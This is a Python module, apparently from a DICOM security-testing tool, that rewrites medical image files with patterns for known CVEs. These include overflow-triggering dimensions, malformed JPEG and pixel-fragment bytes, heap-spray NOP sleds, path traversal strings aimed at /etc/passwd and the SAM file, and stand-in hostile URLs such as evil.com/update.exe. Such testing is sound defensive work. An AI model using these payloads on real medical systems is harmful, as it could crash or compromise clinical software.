"""Exploit Pattern Applicator - Applies known CVE patterns to DICOM files.

This module applies known vulnerability patterns to DICOM files for security
validation testing. Unlike fuzzing (which discovers unknown bugs through random
mutations), this applies specific exploit patterns based on published CVEs.

CVEs Covered:
- CVE-2025-5943: Heap buffer overflow via large dimensions
- CVE-2025-53619: GDCM out-of-bounds read in JPEGBITSCodec
- CVE-2025-53618: GDCM out-of-bounds read in JPEG decompression
- CVE-2025-11266: Integer underflow in encapsulated PixelData
- CVE-2025-1001: RadiAnt DICOM Viewer certificate bypass (MitM)
- CVE-2020-29625: DoS via malformed length fields
- CVE-2021-41946: Path traversal via filename injection
- CVE-2022-24193: DoS via deep sequence nesting
- CVE-2019-11687: Polyglot files (PE/ELF in DICOM preamble)
"""

import contextlib
import logging
import random
import struct

from pydicom.dataset import Dataset
from pydicom.dataelem import DataElement
from pydicom.sequence import Sequence
from pydicom.tag import Tag
from pydicom.uid import UID

logger = logging.getLogger(__name__)


class ExploitPatternApplicator:
    """Applies known CVE-based exploit patterns to DICOM datasets.

    This is NOT fuzzing - it applies specific, known vulnerability patterns
    to test if a viewer is susceptible to published CVEs. Use this for
    vulnerability validation, not bug discovery.

    For actual fuzzing (discovering unknown bugs), use the robustness
    strategies: metadata, header, pixel, structure.
    """

    def __init__(self) -> None:
        """Initialize exploit pattern applicator with pattern registry."""
        self.patterns_applied: list[str] = []

        # CVE-2025-5943 specific patterns
        self.oversized_vr_lengths = [
            0xFFFF,
            0xFFFE,
            0x8000,
            0x7FFF,
            0x10000,
            0x100000,
        ]

        # Common heap spray patterns
        self.heap_spray_patterns = [
            b"\x0c\x0c\x0c\x0c" * 256,
            b"\x90" * 1024,
            b"\x41" * 512,
            b"\xeb\xfe" * 256,
            b"\xcc" * 512,
        ]

    def apply_exploit_patterns(self, dataset: Dataset) -> Dataset:
        """Apply random CVE-based exploit patterns to dataset.

        Args:
            dataset: DICOM dataset to modify

        Returns:
            Modified dataset with exploit patterns applied

        """
        patterns = [
            ("CVE-2025-5943:heap_overflow", self._heap_overflow_dimensions),
            ("CVE-2025-5943:integer_overflow", self._integer_overflow_dimensions),
            ("CVE-2025-5943:vr_length", self._cve_2025_5943_vr_overflow),
            ("CVE-2025-53619:jpeg_oob", self._cve_2025_53619_pattern),
            ("CVE-2025-53618:jpeg_bitstream", self._cve_2025_53618_pattern),
            ("CVE-2025-11266:fragment", self._cve_2025_11266_pattern),
            ("CVE-2025-1001:url_injection", self._cve_2025_1001_pattern),
            ("CVE-2020-29625:malformed_length", self._malformed_string_lengths),
            ("CVE-2021-41946:path_traversal", self._path_traversal),
            ("CVE-2022-24193:deep_nesting", self._deep_nesting),
            ("CVE-2019-11687:polyglot_marker", self._polyglot_marker),
            ("GENERIC:heap_spray", self._heap_spray_pattern),
            ("GENERIC:encoding_confusion", self._encoding_confusion_pattern),
            ("GENERIC:invalid_transfer_syntax", self._invalid_transfer_syntax),
        ]

        num_patterns = random.randint(1, 3)
        selected = random.sample(patterns, min(num_patterns, len(patterns)))

        for name, pattern_func in selected:
            try:
                dataset = pattern_func(dataset)
                self.patterns_applied.append(name)
                logger.debug(f"Applied exploit pattern: {name}")
            except Exception as e:
                logger.debug(f"Exploit pattern {name} failed: {e}")

        return dataset

    # =========================================================================
    # CVE-2025-5943: MicroDicom heap buffer overflow
    # =========================================================================

    def _heap_overflow_dimensions(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Set extreme image dimensions to trigger heap overflow."""
        dataset.Rows = 65535
        dataset.Columns = 65535
        dataset.BitsAllocated = 16
        dataset.BitsStored = 16
        dataset.HighBit = 15
        dataset.SamplesPerPixel = 1
        return dataset

    def _integer_overflow_dimensions(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Set dimensions that cause integer overflow."""
        overflow_pairs = [
            (32768, 32768),
            (46341, 46341),
            (65535, 65535),
        ]
        rows, cols = random.choice(overflow_pairs)
        dataset.Rows = rows
        dataset.Columns = cols
        dataset.BitsAllocated = 16
        return dataset

    def _cve_2025_5943_vr_overflow(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Oversized VR length fields."""
        vulnerable_tags = [
            (0x0008, 0x0005),
            (0x0008, 0x0008),
            (0x0008, 0x0016),
            (0x0008, 0x0020),
            (0x0008, 0x0070),
        ]

        tags_to_mutate = random.sample(
            vulnerable_tags, min(random.randint(1, 3), len(vulnerable_tags))
        )

        for tag_tuple in tags_to_mutate:
            tag = Tag(tag_tuple)
            if tag in dataset:
                oversized_length = random.choice(self.oversized_vr_lengths)
                if oversized_length <= 0x10000:
                    payload = b"A" * min(oversized_length, 0x8000)
                else:
                    payload = b"B" * 1024

                try:
                    elem = dataset[tag]
                    elem._value = payload
                    if hasattr(elem, "VR"):
                        elem.VR = "UN"
                except Exception as e:
                    logger.debug(f"Failed to corrupt tag {tag}: {e}")

        return dataset

    # =========================================================================
    # CVE-2025-53619: GDCM JPEG OOB read
    # =========================================================================

    def _cve_2025_53619_pattern(self, dataset: Dataset) -> Dataset:
        """CVE-2025-53619: Malformed JPEG pixel data for OOB read."""
        jpeg_transfer_syntaxes = [
            "1.2.840.10008.1.2.4.50",
            "1.2.840.10008.1.2.4.51",
            "1.2.840.10008.1.2.4.70",
            "1.2.840.10008.1.2.4.90",
        ]

        if hasattr(dataset, "file_meta"):
            with contextlib.suppress(Exception):
                dataset.file_meta.TransferSyntaxUID = UID(
                    random.choice(jpeg_transfer_syntaxes)
                )

        jpeg_attack_patterns = [
            b"\xff\xd8",
            b"\xff\xd8\xff\xfe\xff\xff\xff\xff",
            b"\xff\xd8\xff\xda\x00\x08\xff\x00\x00\x00\x00\x00",
            b"\xff\xd8\xff\xc4\xff\xff" + b"\x00" * 100,
            b"\xff\xd8\xff\xdb\x00\x43" + b"\xff" * 64,
            b"\xff\xd8\xff\xc0\x00\x0b\x08\xff\xff\xff\xff\x01\x01\x11\x00",
            b"\xff\xd8" * 10 + b"\xff\xd9",
        ]

        if hasattr(dataset, "PixelData"):
            attack_payload = random.choice(jpeg_attack_patterns)
            try:
                encapsulated = (
                    b"\xfe\xff\x00\xe0\x00\x00\x00\x00"
                    + b"\xfe\xff\x00\xe0"
                    + struct.pack("<L", len(attack_payload))
                    + attack_payload
                    + b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"
                )
                dataset.PixelData = encapsulated
            except Exception as e:
                logger.debug(f"CVE-2025-53619 pattern failed: {e}")

        return dataset

    # =========================================================================
    # CVE-2025-53618: GDCM JPEG bitstream OOB read
    # =========================================================================

    def _cve_2025_53618_pattern(self, dataset: Dataset) -> Dataset:
        """CVE-2025-53618: Corrupted JPEG bitstream for OOB read."""
        jpeg_bitstream_attacks = [
            b"\xff\xd8\xff\xc4\x00\x1f\x00" + bytes([0x10] * 16) + b"\x00" * 12,
            b"\xff\xd8\xff\xc4\x01\x00\x00" + bytes([0xFF] * 16) + b"\x00" * 200,
            b"\xff\xd8\xff\xdd\x00\x04\xff\xff" + b"\xff\xd0" * 100,
            b"\xff\xd8\xff\xcc\x00\xff" + b"\xff" * 50,
        ]

        if hasattr(dataset, "PixelData") or random.random() < 0.5:
            try:
                attack_payload = random.choice(jpeg_bitstream_attacks)
                encapsulated = (
                    b"\xfe\xff\x00\xe0\x00\x00\x00\x00"
                    + b"\xfe\xff\x00\xe0"
                    + struct.pack("<L", len(attack_payload))
                    + attack_payload
                    + b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"
                )
                dataset.PixelData = encapsulated

                if hasattr(dataset, "file_meta"):
                    dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")
            except Exception as e:
                logger.debug(f"CVE-2025-53618 pattern failed: {e}")

        return dataset

    # =========================================================================
    # CVE-2025-11266: GDCM encapsulated pixel data integer underflow
    # =========================================================================

    def _cve_2025_11266_pattern(self, dataset: Dataset) -> Dataset:
        """CVE-2025-11266: Malformed encapsulated pixel data fragments."""
        # Set conflicting frame info to trigger integer underflow
        dataset.NumberOfFrames = 10
        dataset.Rows = 1
        dataset.Columns = 1
        dataset.BitsAllocated = 8

        fragment_attacks = [
            b"\xfe\xff\x00\xe0\xff\xff\xff\xff",
            b"\xfe\xff\x00\xe0\x00\x00\x00\x00" + b"\xfe\xff\x00\xe0\xff\xff\xff\x7f",
            b"\xfe\xff\x00\xe0" + struct.pack("<L", 0xFFFFFFFE),
            (b"\xfe\xff\x00\xe0\x01\x00\x00\x00\x00") * 1000,
            b"\xfe\xff\x00\xe0\x03\x00\x00\x00ABC" + b"\xfe\xff\x00\xe0\x05\x00\x00\x00DEFGH",
        ]

        if hasattr(dataset, "PixelData") or random.random() < 0.5:
            try:
                offset_table = b"\xfe\xff\x00\xe0"
                offset_table += struct.pack(
                    "<L",
                    random.choice([0xFFFFFFFF, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFE]),
                )
                attack = random.choice(fragment_attacks)
                delimiter = b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"

                dataset.PixelData = offset_table + attack + delimiter

                if hasattr(dataset, "file_meta"):
                    dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")
            except Exception as e:
                logger.debug(f"CVE-2025-11266 pattern failed: {e}")

        return dataset

    # =========================================================================
    # CVE-2025-1001: RadiAnt certificate validation bypass
    # =========================================================================

    def _cve_2025_1001_pattern(self, dataset: Dataset) -> Dataset:
        """CVE-2025-1001: URL injection for MitM testing."""
        malicious_urls = [
            "http://evil.com/update.exe",
            "https://attacker.local/dicom.dcm",
            "file:///etc/passwd",
            "ftp://malicious.server/payload",
            "\\\\attacker.com\\share\\malware.exe",
        ]

        url_fields = [
            "RetrieveURL",
            "StorageMediaFileSetID",
            "SourceApplicationEntityTitle",
        ]

        for field_name in url_fields:
            if random.random() < 0.3:
                try:
                    setattr(dataset, field_name, random.choice(malicious_urls))
                except Exception as e:
                    logger.debug(f"URL injection failed for {field_name}: {e}")

        private_groups = [0x0009, 0x0011]
        for group in random.sample(private_groups, 1):
            try:
                creator_tag = Tag(group, 0x0010)
                dataset[creator_tag] = DataElement(creator_tag, "LO", "URL_INJECTION_TEST")
                data_tag = Tag(group, 0x1000)
                dataset[data_tag] = DataElement(data_tag, "LO", random.choice(malicious_urls))
            except Exception as e:
                logger.debug(f"Private element injection failed: {e}")

        return dataset

    # =========================================================================
    # CVE-2020-29625: DCMTK DoS via malformed lengths
    # =========================================================================

    def _malformed_string_lengths(self, dataset: Dataset) -> Dataset:
        """CVE-2020-29625: Insert extremely long strings to trigger buffer issues."""
        long_string_2k = "A" * 2048
        long_string_32k = "X" * 32768

        if hasattr(dataset, "PatientName"):
            dataset.PatientName = long_string_2k
        if hasattr(dataset, "InstitutionName"):
            dataset.InstitutionName = long_string_32k
        if hasattr(dataset, "StudyDescription"):
            dataset.StudyDescription = long_string_2k
        if hasattr(dataset, "SeriesDescription"):
            dataset.SeriesDescription = long_string_32k

        dataset.add_new(Tag(0x0009, 0x0010), "LO", long_string_32k)

        return dataset

    # =========================================================================
    # CVE-2021-41946: ClearCanvas path traversal
    # =========================================================================

    def _path_traversal(self, dataset: Dataset) -> Dataset:
        """CVE-2021-41946: Inject path traversal payloads."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "\\\\server\\share\\file",
        ]

        payload = random.choice(payloads)
        dataset.add_new(Tag(0x0009, 0x1001), "LO", payload)

        try:
            dataset.StorageMediaFileSetID = payload[:16]
        except Exception as e:
            logger.debug(f"Could not set StorageMediaFileSetID: {e}")

        return dataset

    # =========================================================================
    # CVE-2022-24193: OsiriX DoS via deep nesting
    # =========================================================================

    def _deep_nesting(self, dataset: Dataset) -> Dataset:
        """CVE-2022-24193: Create deeply nested sequences to exhaust stack."""
        nesting_depth = random.randint(50, 200)

        inner_dataset = Dataset()
        inner_dataset.PatientName = "Nested"

        for _ in range(nesting_depth):
            wrapper = Dataset()
            wrapper.add_new(Tag(0x0008, 0x1115), "SQ", Sequence([inner_dataset]))
            inner_dataset = wrapper

        dataset.add_new(Tag(0x0008, 0x1115), "SQ", Sequence([inner_dataset]))

        return dataset

    # =========================================================================
    # CVE-2019-11687: DICOM polyglot files
    # =========================================================================

    def _polyglot_marker(self, dataset: Dataset) -> Dataset:
        """CVE-2019-11687: Add markers indicating polyglot potential."""
        if hasattr(dataset, "file_meta"):
            dataset.file_meta.ImplementationClassUID = UID("1.2.3.4.5.6.7.8.9.0.MZ")

        dataset.add_new(Tag(0x0009, 0x1000), "LO", "POLYGLOT_TEST_MARKER")

        return dataset

    # =========================================================================
    # Generic exploit patterns
    # =========================================================================

    def _heap_spray_pattern(self, dataset: Dataset) -> Dataset:
        """Apply heap spray patterns to facilitate exploitation."""
        spray_targets = ["PixelData", "OverlayData", "WaveformData"]

        for field_name in spray_targets:
            if hasattr(dataset, field_name):
                spray_pattern = random.choice(self.heap_spray_patterns)
                if random.random() > 0.7:
                    spray_pattern = b"\xeb\x0e" + b"\x90" * 12 + spray_pattern
                try:
                    setattr(dataset, field_name, spray_pattern)
                except Exception as e:
                    logger.debug(f"Failed to set field {field_name}: {e}")

        return dataset

    def _encoding_confusion_pattern(self, dataset: Dataset) -> Dataset:
        """Apply encoding confusion patterns to trigger parsing errors."""
        if hasattr(dataset, "SpecificCharacterSet"):
            confused_charsets = [
                "ISO-IR 100\\ISO-IR 144",
                "INVALID_CHARSET",
                "",
                "\\",
            ]
            dataset.SpecificCharacterSet = random.choice(confused_charsets)

        return dataset

    def _invalid_transfer_syntax(self, dataset: Dataset) -> Dataset:
        """Inject invalid transfer syntax UID."""
        invalid_uids = [
            "1.2.3.4.5.6.7.8.9.0" + "." * 50,
            "0.0",
            "1.2.840.10008.1.2.4.9999",
            "INVALID.TRANSFER.SYNTAX",
        ]

        if hasattr(dataset, "file_meta"):
            dataset.file_meta.TransferSyntaxUID = UID(random.choice(invalid_uids))

        return dataset

    # =========================================================================
    # Utility methods
    # =========================================================================

    def get_patterns_applied(self) -> list[str]:
        """Return list of patterns applied in last call."""
        return self.patterns_applied.copy()

    def reset_stats(self) -> None:
        """Reset pattern tracking."""
        self.patterns_applied = []

    # Backward compatibility
    def apply_cve_mutations(self, dataset: Dataset) -> Dataset:
        """Deprecated: Use apply_exploit_patterns instead."""
        return self.apply_exploit_patterns(dataset)

    def apply_all_patterns(self, dataset: Dataset) -> Dataset:
        """Apply all available exploit patterns."""
        return self.apply_exploit_patterns(dataset)

    def get_mutations_applied(self) -> list[str]:
        """Deprecated: Use get_patterns_applied instead."""
        return self.get_patterns_applied()

    @property
    def mutations_applied(self) -> list[str]:
        """Deprecated: Use patterns_applied instead."""
        return self.patterns_applied

    @mutations_applied.setter
    def mutations_applied(self, value: list[str]) -> None:
        """Deprecated: Use patterns_applied instead."""
        self.patterns_applied = value

    def _pixel_data_fragment_attack(self, dataset: Dataset) -> Dataset:
        """Deprecated: Use _cve_2025_11266_pattern instead."""
        return self._cve_2025_11266_pattern(dataset)


# Backward compatibility aliases
CVEFuzzer = ExploitPatternApplicator
SecurityPatternFuzzer = ExploitPatternApplicator


# =============================================================================
# Binary-Level Exploit Patterns
# =============================================================================


def create_binary_sequence_attacks() -> list[tuple[str, bytes]]:
    """Create binary-level sequence attacks for file corruption."""
    attacks = []

    missing_delim = b"\xFE\xFF\x00\xE0" + b"\xFF\xFF\xFF\xFF" + b"\x00" * 100
    attacks.append(("missing_seq_delimiter", missing_delim))

    missing_item_delim = (
        b"\xFE\xFF\x00\xE0" + b"\xFF\xFF\xFF\xFF" + b"\x00" * 100
        + b"\xFE\xFF\xDD\xE0" + b"\x00\x00\x00\x00"
    )
    attacks.append(("missing_item_delimiter", missing_item_delim))

    corrupted_item_tag = b"\xFE\xFF\x01\xE0" + b"\x00\x00\x00\x10" + b"\x00" * 16
    attacks.append(("corrupted_item_tag", corrupted_item_tag))

    large_length = b"\x08\x00\x15\x11" + b"SQ" + b"\x00\x00" + b"\xFF\xFF\xFF\x7F"
    attacks.append(("large_sequence_length", large_length))

    negative_length = b"\x08\x00\x15\x11" + b"SQ" + b"\x00\x00" + b"\xFF\xFF\xFF\xFF"
    attacks.append(("negative_length", negative_length))

    return attacks


def create_encapsulated_pixel_attacks() -> list[tuple[str, bytes]]:
    """Create binary attacks for encapsulated pixel data."""
    attacks = []

    pixel_tag = b"\xE0\x7F\x10\x00"

    empty_bot = (
        pixel_tag + b"OB" + b"\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0" + b"\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0" + b"\x10\x00\x00\x00" + b"\xFF" * 16
        + b"\xFE\xFF\xDD\xE0" + b"\x00\x00\x00\x00"
    )
    attacks.append(("empty_bot", empty_bot))

    zero_fragment = (
        pixel_tag + b"OB\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0" + b"\x00\x00\x00\x00"
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("zero_length_fragment", zero_fragment))

    undefined_fragment = (
        pixel_tag + b"OB\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0" + b"\xFF\xFF\xFF\xFF" + b"\xFF" * 100
        + b"\xFE\xFF\x0D\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("undefined_length_fragment", undefined_fragment))

    missing_delim = (
        pixel_tag + b"OB\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0" + b"\x10\x00\x00\x00" + b"\xFF" * 16
    )
    attacks.append(("missing_sequence_delimiter", missing_delim))

    overlapping_bot = (
        pixel_tag + b"OB\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0" + b"\x0C\x00\x00\x00"
        + struct.pack("<I", 0) + struct.pack("<I", 8) + struct.pack("<I", 4)
        + b"\xFE\xFF\x00\xE0\x20\x00\x00\x00" + b"\xFF" * 32
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("overlapping_offsets", overlapping_bot))

    large_offset_bot = (
        pixel_tag + b"OB\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0" + b"\x04\x00\x00\x00"
        + struct.pack("<I", 0x7FFFFFFF)
        + b"\xFE\xFF\x00\xE0\x10\x00\x00\x00" + b"\xFF" * 16
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("large_offset", large_offset_bot))

    negative_offset_bot = (
        pixel_tag + b"OB\x00\x00" + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0" + b"\x04\x00\x00\x00"
        + struct.pack("<i", -1)
        + b"\xFE\xFF\x00\xE0\x10\x00\x00\x00" + b"\xFF" * 16
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("negative_offset", negative_offset_bot))

    return attacks


def create_transfer_syntax_attacks() -> list[tuple[str, bytes]]:
    """Create binary attacks targeting transfer syntax handling."""
    attacks = []

    ts_tag = b"\x02\x00\x10\x00"

    unknown_ts = ts_tag + b"UI" + b"\x1A\x00" + b"9.9.999.99999.9.9.9.9.9.9" + b"\x00"
    attacks.append(("unknown_transfer_syntax", unknown_ts))

    empty_ts = ts_tag + b"UI" + b"\x00\x00"
    attacks.append(("empty_transfer_syntax", empty_ts))

    long_ts = ts_tag + b"UI" + b"\x00\x01" + b"1.2.840." + b"9" * 248
    attacks.append(("long_transfer_syntax", long_ts))

    null_ts = ts_tag + b"UI" + b"\x20\x00" + b"1.2.840.10008\x00\x00\x00.1.2.1" + b"\x00" * 6
    attacks.append(("null_in_transfer_syntax", null_ts))

    mixed_encoding = (
        b"\x08\x00\x18\x00" + b"UI" + b"\x00\x00" + b"\x20\x00\x00\x00"
        + b"1.2.3.4.5.6.7.8.9.0.1.2.3.4.5" + b"\x00"
    )
    attacks.append(("mixed_explicit_implicit", mixed_encoding))

    wrong_endian = (
        b"\x00\x08\x00\x18" + b"\x00\x00\x00\x20"
        + b"1.2.3.4.5.6.7.8.9.0.1.2.3.4.5" + b"\x00\x00"
    )
    attacks.append(("wrong_endianness", wrong_endian))

    fake_deflate_ts = ts_tag + b"UI" + b"\x18\x00" + b"1.2.840.10008.1.2.1.99" + b"\x00\x00"
    attacks.append(("fake_deflated", fake_deflate_ts))

    return attacks


def create_length_overflow_attacks() -> list[tuple[str, bytes]]:
    """Create binary attacks targeting length field parsing."""
    attacks = []

    test_tag = b"\x08\x00\x50\x00"

    undefined_len = test_tag + b"LO" + b"\x00\x00" + b"\xFF\xFF\xFF\xFF" + b"TEST"
    attacks.append(("undefined_length_non_sq", undefined_len))

    oversize_len = test_tag + b"LO" + b"\x00\x00" + b"\x00\x10\x00\x00" + b"ONLY16BYTESHERE!"
    attacks.append(("length_exceeds_data", oversize_len))

    max_short_len = test_tag + b"SH" + b"\xFF\xFF" + b"SHORT"
    attacks.append(("max_16bit_length", max_short_len))

    odd_length = b"\xE0\x7F\x10\x00" + b"OW" + b"\x00\x00" + b"\x01\x00\x00\x00" + b"\xFF"
    attacks.append(("odd_length_ow", odd_length))

    signed_negative = test_tag + b"LO" + b"\x00\x00" + b"\x00\x00\x00\x80" + b"DATA"
    attacks.append(("signed_negative_length", signed_negative))

    overflow_dimensions = (
        b"\x28\x00\x10\x00" + b"US" + b"\x02\x00" + b"\xFF\xFF"
        + b"\x28\x00\x11\x00" + b"US" + b"\x02\x00" + b"\xFF\xFF"
    )
    attacks.append(("dimension_overflow", overflow_dimensions))

    return attacks
